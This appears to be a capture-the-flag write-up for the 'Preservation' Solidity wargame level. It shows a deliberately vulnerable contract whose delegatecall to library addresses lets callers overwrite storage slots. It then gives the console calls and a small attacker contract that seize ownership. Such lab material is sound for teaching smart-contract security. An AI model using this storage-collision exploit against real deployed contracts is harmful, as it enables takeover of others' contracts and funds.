## 16. Preservation

Goal for this exercise is:

- claim ownership of the instance


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
~~~
<br>
Need calls to solve were:

- `contract.setSecondTime("<address to PreservationExploit>")`
- `contract.setFirstTime(player)`

<br>

Here`delegatecall`is used to overwrite data in storage slots.

~~~
pragma solidity ^0.6.0;

contract PreservationExploit {

    address public timeZone1Library;
    address public timeZone2Library;
    uint storedTime;  // slot 2 is same as owner in Preservation contract
    
    function setTime(uint _time) public {
        storedTime = _time;
    }

}
~~~
